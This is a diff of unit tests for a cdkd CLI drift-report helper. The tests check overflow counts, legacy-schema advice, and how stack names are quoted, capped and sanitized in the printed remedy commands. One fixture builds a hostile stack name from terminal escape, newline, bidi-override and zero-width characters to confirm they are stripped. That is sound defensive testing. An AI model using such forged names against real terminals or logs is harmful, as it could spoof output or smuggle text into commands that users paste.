+        expect(advice).toContain('migrate it first with any cdkd write, such as a deploy.');
+      }
+    });
+
+    it(`v${version}: PRINTS the refresh command, shell-quoted and last, when rendering left it exact`, () => {
+      // The other direction: without it, withholding unconditionally leaves
+      // every case above green. `Parent~Child` needs QUOTING but not
+      // sanitizing — `~` is outside the unquoted class — so it is exact and the
+      // command is printed, quoted, with its region, as the whole tail.
+      const advice = refreshAdviceFor(version, 'Parent~Child', 'us-east-1');
+      expect(advice.trimEnd().endsWith(
+        "cdkd state refresh-observed 'Parent~Child' --stack-region us-east-1"
+      )).toBe(true);
+      expect(advice).not.toContain('The command is not printed');
+
+      // LONG names that fit the STACK cap are exact too: past a region's 128
+      // and at exactly 1152. A gate measuring the name against the wrong cap
+      // would withhold these legitimate nested names.
+      for (const length of [129, 1152]) {
+        const name = `P~${'x'.repeat(length - 2)}`;
+        const long = refreshAdviceFor(version, name, 'us-east-1');
+        expect(long.trimEnd().endsWith(
+          `cdkd state refresh-observed '${name}' --stack-region us-east-1`
+        ), `a ${length}-code-point name was withheld`).toBe(true);
+      }
+    });
+  }
+
+  it('does not say "and 0 more" at EXACTLY the ten-name cap', () => {
+    // The boundary the eleven-row case above does not reach: with `> 10`
+    // widened to `>= 10` a ten-row record gains an `... and 0 more` line, and
+    // every other case here stays green.
+    const logger = makeLogger();
+    const resources: Record<string, unknown> = {};
+    for (let i = 0; i < 10; i++) resources[`Broken${i}`] = null;
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: resources as never,
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    expect(messages.filter((m) => /^ {2}Broken\d+$/.test(m))).toHaveLength(10);
+    expect(messages.some((m) => /and -?\d+ more/.test(m))).toBe(false);
+  });
+
+  it('does not say "and N more" BELOW the ten-name cap either', () => {
+    // `unreadable.length > 10` widened to `!== 10` is true for every count
+    // under the cap, so one broken row would print "and -9 more". The exact-cap
+    // case cannot reach that arm.
+    for (const count of [1, 5, 9]) {
+      const logger = makeLogger();
+      const resources: Record<string, unknown> = {};
+      for (let i = 0; i < count; i++) resources[`Broken${i}`] = null;
+      reportDriftBaselineGaps(
+        {
+          version: 10,
+          stackName: 'S',
+          region: 'r',
+          resources: resources as never,
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+      expect(messages.filter((m) => /^ {2}Broken\d+$/.test(m))).toHaveLength(count);
+      expect(
+        messages.some((m) => /and -?\d+ more/.test(m)),
+        `${count} rows below the cap gained an overflow summary`
+      ).toBe(false);
+    }
+  });
+
+  it('the PRE-v3 advice takes the same repair-first branch', () => {
+    // The legacy arm is a second copy of the advice and was fixed a round after
+    // the v3+ one. Forcing its conditional to `false` restored a recommendation
+    // to run a command that refuses, and every other case here stayed green:
+    // the only v2 case asserted the warning COUNT and the schema text.
+    const withBroken = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 2,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          BrokenRow: null as never,
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      withBroken as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    const legacy = withBroken.warn.mock.calls
+      .map((c) => String(c[0]))
+      .find((m) => m.includes('schema is v2'));
+    expect(legacy).toBeDefined();
+    expect(legacy).toContain('Repair the 1 unreadable record(s) named above first');
+    // It NAMES the command, as the thing that refuses; what it must not do is
+    // OFFER it — the other arm's `or run: <command>` shape, which is what a
+    // reader pastes.
+    expect(legacy).not.toContain('or run: cdkd state refresh-observed');
+
+    // The other arm, whose command carries the stack name, is driven by the
+    // `v2:` WITHHOLDS / PRINTS cases above.
+  });
+
+  it('sanitizes, caps and stands in for the stack name in the INSPECT command too', () => {
+    // A different command from the refresh advice, built in a different branch:
+    // replacing its sanitizing helper with the raw name survived every
+    // other case, because the only stack fixture reaching it carried shell
+    // metacharacters (which `shellQuote` handles) and nothing the ALLOWLIST is
+    // for.
+    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+    function inspectLineFor(stackName: string): string | undefined {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 10,
+          stackName,
+          region: 'r',
+          resources: { BrokenRow: null as never },
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      return logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes('cdkd state show'));
+    }
+
+    const hostile = inspectLineFor(`Evil${FORGERIES.join('')}Stack`);
+    expect(hostile).toBeDefined();
+    for (const forge of FORGERIES) expect(hostile).not.toContain(forge);
+
+    // 1152, not 128: a cdkd record's stack name is `parent~child` applied
+    // recursively, so `STACK_REF_MAX_CODE_POINTS` is the cap a legitimate
+    // nested name needs — capping it at an identifier's 128 emitted a remedy
+    // command naming a stack that does not exist.
+    const long = inspectLineFor('q'.repeat(5000));
+    expect(long).toContain(`${'q'.repeat(1152)}...`);
+    expect(long).not.toContain('q'.repeat(1153));
+    // The remedy is still on screen after the cap — a DISTANCE, sized to the
+    // wider identifier rather than to the old one.
+    expect(long!.length).toBeLessThan(1600);
+
+    // Nothing renderable left becomes the named stand-in rather than an empty
+    // argument, which `cdkd state show` would read as no stack at all.
+    expect(inspectLineFor('\u0000\u0001')).toContain('<unrenderable>');
+  });
+
+  it('stands in for an id or stack name with nothing renderable, at every position', () => {
+    // `<unrenderable>` is the other half of the same helper, and the oversized
+    // and hostile fixtures elsewhere do not reach it: removing the stand-in
+    // from the refreshable list or the refused list left every case green,
+    // because the only empty-after-sanitization fixture was in the unreadable
+    // list. An empty id prints a bullet naming nothing. (For the refresh
+    // command, a blank name WITHHOLDS the command rather than standing in.)
+    const BLANK = '\u0000\u0001';
+
+    // The two ID lists, in one record so both are printed.
+    const ids = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          [BLANK]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          [`${BLANK}\u0002`]: {
+            physicalId: 'p2',
+            resourceType: 'AWS::SSM::Parameter',
+            properties: {},
+            observedBaselineRefused: true,
+          },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      ids as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    const idRows = ids.warn.mock.calls.map((c) => String(c[0])).filter((m) => m.startsWith('  '));
+    // BOTH lists, each with its own empty-after-sanitization id: an earlier cut
+    // gave the refused one a name that sanitized to `2`, so removing that
+    // list's stand-in survived. A count of two is what makes this a
+    // per-position assertion rather than a claim about one of them.
+    expect(idRows.filter((m) => m.trim() === '<unrenderable>')).toHaveLength(2);
+    // ...and both lists really were printed, or the count above is about rows
+    // that never happened.
+    const summaries = ids.warn.mock.calls.map((c) => String(c[0]));
+    expect(summaries.some((m) => m.includes('lack an'))).toBe(true);
+    expect(summaries.some((m) => m.includes('REFUSED'))).toBe(true);
+
+    // The two refresh commands, one per schema version.
+    for (const [version, needle] of [
+      [10, 'refresh-observed'],
+      [2, 'schema is v2'],
+    ] as const) {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version,
+          stackName: BLANK,
+          region: 'r',
+          resources: {
+            Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          },
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const advice = logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes(needle));
+      expect(advice, `v${version}: no advice was printed`).toBeDefined();
+      // WITHHELD rather than stood in for: a WRITING command addressed to
+      // `'<unrenderable>'` names no stack the reader can mean.
+      expect(advice, `v${version}: a refresh command was printed for a blank name`).not.toMatch(
+        /cdkd state refresh-observed \S/
+      );
+      expect(advice).toContain('The command is not printed');
+    }
+  });
+
+  it('gives the plain refresh advice when every entry is readable', () => {
+    // The other direction for the conditional above: without this, hard-coding
+    // the repair-first branch leaves the case above green while removing the
+    // advice this function exists to give.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'MyStack',
+        region: 'r',
+        resources: {
+          Refreshable: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const refreshAdvice = logger.warn.mock.calls
+      .map((c) => String(c[0]))
+      .find((m) => m.includes('refresh-observed'));
+    expect(refreshAdvice).toBeDefined();
+    expect(refreshAdvice).not.toContain('Repair the');
+    // The command is emitted LAST and carries the stack name, so it is
+    // pasteable as printed.
+    expect(refreshAdvice!.trimEnd()).toMatch(
+      /cdkd state refresh-observed MyStack --stack-region r$/
+    );
+  });
 });
 
 // -----------------------------------------------------------------------------
